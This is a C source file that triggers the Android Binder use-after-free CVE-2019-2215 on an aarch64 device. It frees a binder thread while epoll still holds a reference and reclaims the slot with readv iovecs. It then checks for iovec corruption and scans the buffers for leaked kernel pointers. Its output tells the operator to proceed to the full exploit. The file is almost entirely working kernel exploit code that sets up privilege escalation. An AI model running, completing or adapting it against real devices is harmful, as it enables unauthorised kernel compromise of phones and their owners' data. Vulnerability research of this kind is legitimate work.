/*
 * binder_uaf_definitive.c - Definitive CVE-2019-2215 UAF test
 *
 * The diagnostics showed readv returning exactly 1 iov consistently
 * across ALL slab sizes. This is a pipe timing artifact: the child
 * writes 64 bytes at a time, and pipe_read returns after the first
 * write arrives (SMP PREEMPT allows preemption between writes).
 *
 * This test fixes the detection by:
 * 1. Writing ALL pipe data in a SINGLE write() call
 * 2. Running a control test (no UAF) to establish baseline
 * 3. Running the UAF test and comparing against control
 *
 * If control returns full data and UAF returns partial/EFAULT,
 * the UAF is definitively confirmed.
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o binder_uaf_definitive binder_uaf_definitive.c
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/uio.h>
#include <sys/wait.h>

#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int)

struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};

static void force_binder_thread(int fd)
{
    struct binder_write_read bwr;
    char buf[32];
    memset(&bwr, 0, sizeof(bwr));
    bwr.read_size = sizeof(buf);
    bwr.read_buffer = (unsigned long)buf;
    ioctl(fd, BINDER_WRITE_READ, &bwr);
}

static int pin_to_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    return sched_setaffinity(0, sizeof(set), &set);
}

#define NUM_IOV     19
#define PER_IOV     64
#define TOTAL_DATA  (NUM_IOV * PER_IOV)  /* 1216 bytes */

/*
 * Control test: readv on pipe with single write, NO binder/UAF.
 * Establishes baseline pipe behavior.
 */
static ssize_t test_control(int attempt)
{
    int pipefd[2];
    if (pipe(pipefd) < 0) { perror("pipe"); return -1; }

    struct iovec iov[NUM_IOV];
    char bufs[NUM_IOV][PER_IOV];
    for (int i = 0; i < NUM_IOV; i++) {
        memset(bufs[i], 0x41 + i, PER_IOV);
        iov[i].iov_base = bufs[i];
        iov[i].iov_len = PER_IOV;
    }

    pid_t pid = fork();
    if (pid < 0) { close(pipefd[0]); close(pipefd[1]); return -1; }

    if (pid == 0) {
        /* CHILD: wait same delay as UAF test, then single write */
        close(pipefd[0]);
        pin_to_cpu(0);
        usleep(110000); /* 110ms total (matches UAF: 100ms + 10ms) */

        /* ONE write of ALL data */
        char data[TOTAL_DATA];
        memset(data, 'Z', sizeof(data));
        write(pipefd[1], data, sizeof(data));

        close(pipefd[1]);
        _exit(0);
    }

    /* PARENT */
    close(pipefd[1]); /* close write end */
    pin_to_cpu(0);

    ssize_t bytes = readv(pipefd[0], iov, NUM_IOV);
    int saved_errno = errno;

    waitpid(pid, NULL, 0);
    close(pipefd[0]);

    printf("  Control[%d]: readv=%zd/%d", attempt, bytes, TOTAL_DATA);
    if (bytes < 0) printf(" errno=%d(%s)", saved_errno, strerror(saved_errno));
    printf("\n");

    return bytes;
}

/*
 * UAF test: readv with single-write pipe data AND binder UAF.
 * If iovec is corrupted by list_del, readv returns EFAULT or partial.
 */
static ssize_t test_uaf_single_write(int attempt, int cpu)
{
    int binder_fd, epfd, pipefd[2];
    struct epoll_event event = { .events = EPOLLIN };

    pin_to_cpu(cpu);

    binder_fd = open("/dev/binder", O_RDONLY);
    if (binder_fd < 0) return -1;
    force_binder_thread(binder_fd);

    epfd = epoll_create(1000);
    if (epfd < 0) { close(binder_fd); return -1; }
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event) < 0) {
        close(epfd); close(binder_fd); return -1;
    }
    if (pipe(pipefd) < 0) {
        close(epfd); close(binder_fd); return -1;
    }

    struct iovec iov[NUM_IOV];
    char bufs[NUM_IOV][PER_IOV];
    for (int i = 0; i < NUM_IOV; i++) {
        memset(bufs[i], 0x41 + i, PER_IOV);
        iov[i].iov_base = bufs[i];
        iov[i].iov_len = PER_IOV;
    }

    pid_t pid = fork();
    if (pid < 0) {
        close(pipefd[0]); close(pipefd[1]);
        close(epfd); close(binder_fd);
        return -1;
    }

    if (pid == 0) {
        /* CHILD */
        close(pipefd[0]);
        pin_to_cpu(cpu);

        /* Wait for parent to free binder_thread and enter readv */
        usleep(100000); /* 100ms */

        /* Trigger list_del on freed binder_thread->wait.task_list */
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);

        /* Let list_del complete */
        usleep(10000); /* 10ms */

        /* SINGLE WRITE of ALL data - no preemption between writes */
        char data[TOTAL_DATA];
        memset(data, 'Z', sizeof(data));
        write(pipefd[1], data, sizeof(data));

        close(pipefd[1]);
        _exit(0);
    }

    /* PARENT */
    close(pipefd[1]); /* close write end */

    /* Free the binder_thread while epoll still references it */
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);

    /* readv: kernel kmallocs iovec copy (19*16=304 -> kmalloc-512),
     * then blocks on pipe_wait. When data arrives as a single chunk,
     * pipe_read iterates ALL iovecs. If iov[5] corrupted -> EFAULT. */
    ssize_t bytes = readv(pipefd[0], iov, NUM_IOV);
    int saved_errno = errno;

    waitpid(pid, NULL, 0);
    close(pipefd[0]);
    close(epfd);
    close(binder_fd);

    printf("  UAF[%d] cpu=%d: readv=%zd/%d", attempt, cpu, bytes, TOTAL_DATA);
    if (bytes < 0) {
        printf(" errno=%d(%s)", saved_errno, strerror(saved_errno));
        if (saved_errno == EFAULT) {
            printf(" *** EFAULT! UAF CONFIRMED! ***");
        }
    } else if (bytes > 0 && bytes < TOTAL_DATA) {
        int completed = (int)(bytes / PER_IOV);
        printf(" (completed %d iovecs, stopped at iov[%d])", completed, completed);
        if (completed <= 5) {
            printf(" *** PARTIAL AT UAF BOUNDARY! ***");
        }
    }
    printf("\n");

    /* Check buffers for kernel pointers or anomalies */
    if (bytes > 0) {
        for (int i = 0; i < NUM_IOV; i++) {
            int iov_start = i * PER_IOV;
            if (iov_start >= bytes) break;

            int filled = (iov_start + PER_IOV <= bytes) ? PER_IOV : (int)(bytes - iov_start);
            unsigned char expected = 0x41 + i;
            for (int j = 0; j < filled; j++) {
                unsigned char c = (unsigned char)bufs[i][j];
                if (c != 'Z' && c != expected) {
                    printf("    iov[%d] byte %d: 0x%02x (expected 0x%02x or 'Z')\n",
                           i, j, c, expected);
                    /* Print the whole iov for context */
                    printf("    iov[%d] full: ", i);
                    for (int k = 0; k < filled && k < 32; k++)
                        printf("%02x ", (unsigned char)bufs[i][k]);
                    printf("\n");
                    break;
                }
            }

            /* Scan for kernel pointers */
            uint64_t *p = (uint64_t *)bufs[i];
            for (int j = 0; j < filled / 8; j++) {
                if ((p[j] & 0xFFFFFF0000000000ULL) == 0xFFFFFFC000000000ULL) {
                    printf("    *** KERNEL PTR in iov[%d]+%d: 0x%016lx ***\n",
                           i, j * 8, p[j]);
                }
            }
        }
    }

    return bytes;
}

/*
 * UAF test with individual writes (original approach for comparison).
 * This is expected to show the timing artifact.
 */
static ssize_t test_uaf_multi_write(int attempt, int cpu)
{
    int binder_fd, epfd, pipefd[2];
    struct epoll_event event = { .events = EPOLLIN };

    pin_to_cpu(cpu);

    binder_fd = open("/dev/binder", O_RDONLY);
    if (binder_fd < 0) return -1;
    force_binder_thread(binder_fd);

    epfd = epoll_create(1000);
    if (epfd < 0) { close(binder_fd); return -1; }
    if (epoll_ctl(epfd, EPOLL_CTL_ADD, binder_fd, &event) < 0) {
        close(epfd); close(binder_fd); return -1;
    }
    if (pipe(pipefd) < 0) {
        close(epfd); close(binder_fd); return -1;
    }

    struct iovec iov[NUM_IOV];
    char bufs[NUM_IOV][PER_IOV];
    for (int i = 0; i < NUM_IOV; i++) {
        memset(bufs[i], 0x41 + i, PER_IOV);
        iov[i].iov_base = bufs[i];
        iov[i].iov_len = PER_IOV;
    }

    pid_t pid = fork();
    if (pid < 0) {
        close(pipefd[0]); close(pipefd[1]);
        close(epfd); close(binder_fd);
        return -1;
    }

    if (pid == 0) {
        close(pipefd[0]);
        pin_to_cpu(cpu);
        usleep(100000);
        epoll_ctl(epfd, EPOLL_CTL_DEL, binder_fd, &event);
        usleep(10000);

        /* INDIVIDUAL writes (original approach) */
        char data[PER_IOV];
        memset(data, 'Z', sizeof(data));
        for (int i = 0; i < NUM_IOV; i++) {
            write(pipefd[1], data, PER_IOV);
        }

        close(pipefd[1]);
        _exit(0);
    }

    close(pipefd[1]);
    ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);

    ssize_t bytes = readv(pipefd[0], iov, NUM_IOV);
    int saved_errno = errno;

    waitpid(pid, NULL, 0);
    close(pipefd[0]);
    close(epfd);
    close(binder_fd);

    printf("  Multi[%d] cpu=%d: readv=%zd/%d", attempt, cpu, bytes, TOTAL_DATA);
    if (bytes < 0) printf(" errno=%d(%s)", saved_errno, strerror(saved_errno));
    else if (bytes > 0 && bytes < TOTAL_DATA) {
        int completed = (int)(bytes / PER_IOV);
        printf(" (completed %d iovecs)", completed);
    }
    printf("\n");

    return bytes;
}

int main(void)
{
    printf("=== CVE-2019-2215 Definitive UAF Test ===\n");
    printf("uid=%d pid=%d\n", getuid(), getpid());
    printf("NUM_IOV=%d PER_IOV=%d TOTAL=%d\n", NUM_IOV, PER_IOV, TOTAL_DATA);
    printf("iovec kmalloc: %d * %zu = %zu bytes -> kmalloc-512\n\n",
           NUM_IOV, sizeof(struct iovec), NUM_IOV * sizeof(struct iovec));

    int fd = open("/dev/binder", O_RDONLY);
    if (fd < 0) { printf("[-] /dev/binder: %s\n", strerror(errno)); return 1; }
    close(fd);

    /* ===== Test A: Control (no UAF) with single write ===== */
    printf("--- Test A: Control (no UAF, single write) ---\n");
    printf("    Expected: readv returns full %d bytes\n", TOTAL_DATA);
    int control_full = 0;
    for (int i = 0; i < 5; i++) {
        ssize_t r = test_control(i);
        if (r == TOTAL_DATA) control_full++;
    }
    printf("  Result: %d/5 returned full data\n\n", control_full);

    if (control_full < 4) {
        printf("[!] Control test inconsistent - pipe timing issue even without UAF\n");
        printf("[!] This is unexpected. Checking pipe buffer size...\n");
        int p[2];
        pipe(p);
        long sz = fcntl(p[0], F_GETPIPE_SZ);
        printf("    Pipe buffer size: %ld bytes\n", sz);
        close(p[0]); close(p[1]);
    }

    /* ===== Test B: UAF with single write ===== */
    printf("--- Test B: UAF with single write (50 attempts, 6 CPUs) ---\n");
    printf("    Expected: EFAULT or partial at iov[5] boundary (320 bytes)\n");
    int uaf_detected = 0;
    int uaf_full = 0;
    int uaf_partial = 0;
    int uaf_efault = 0;

    for (int i = 0; i < 50 && !uaf_detected; i++) {
        int cpu = i % 6;
        ssize_t r = test_uaf_single_write(i, cpu);

        if (r < 0 && errno == EFAULT) {
            uaf_efault++;
            uaf_detected = 1;
        } else if (r > 0 && r < TOTAL_DATA) {
            uaf_partial++;
            int completed = (int)(r / PER_IOV);
            if (completed <= 5) {
                uaf_detected = 1; /* At or before the UAF boundary */
            }
        } else if (r == TOTAL_DATA) {
            uaf_full++;
        }

        if (i > 0 && i % 10 == 0 && !uaf_detected) {
            printf("  [%d/50] full=%d partial=%d efault=%d\n",
                   i, uaf_full, uaf_partial, uaf_efault);
        }
    }

    printf("\n  UAF Results: full=%d partial=%d efault=%d detected=%d\n\n",
           uaf_full, uaf_partial, uaf_efault, uaf_detected);

    /* ===== Test C: Original multi-write for comparison ===== */
    printf("--- Test C: Original multi-write (10 attempts, comparison) ---\n");
    printf("    Expected: always 64 bytes (timing artifact)\n");
    int multi_64 = 0;
    for (int i = 0; i < 10; i++) {
        ssize_t r = test_uaf_multi_write(i, i % 6);
        if (r == PER_IOV) multi_64++;
    }
    printf("  Result: %d/10 returned exactly %d bytes (timing artifact)\n\n",
           multi_64, PER_IOV);

    /* ===== Summary ===== */
    printf("=== DEFINITIVE RESULT ===\n");

    if (control_full >= 4 && uaf_detected) {
        printf("[+] CONFIRMED: CVE-2019-2215 UAF is real and corrupts the iovec!\n");
        printf("[+] Control returns full data, UAF returns EFAULT/partial.\n");
        printf("[+] Previous 'detection' was a timing artifact, but the bug IS real.\n");
        printf("[+] Proceed to full exploit using single-write technique.\n");
    } else if (control_full >= 4 && !uaf_detected) {
        printf("[-] UAF not detected after 50 attempts with single-write fix.\n");
        printf("[-] Control works (full data), but spray never reclaims the slot.\n");
        printf("[-] Possible causes:\n");
        printf("    - SLUB freelist isolation (cross-cache reclaim blocked)\n");
        printf("    - binder_thread actual size differs from estimate\n");
        printf("    - Need more attempts or different spray technique\n");
    } else if (control_full < 4) {
        printf("[?] Control test failed - pipe has timing issues even without UAF.\n");
        printf("[?] Need to investigate pipe buffering on this kernel.\n");
    }

    if (multi_64 >= 8) {
        printf("\n[*] CONFIRMED: Original PoC's 64-byte return was a timing artifact.\n");
        printf("[*] Individual writes get preempted. Single write is required.\n");
    }

    printf("\n=== DONE ===\n");
    return uaf_detected ? 0 : 2;
}
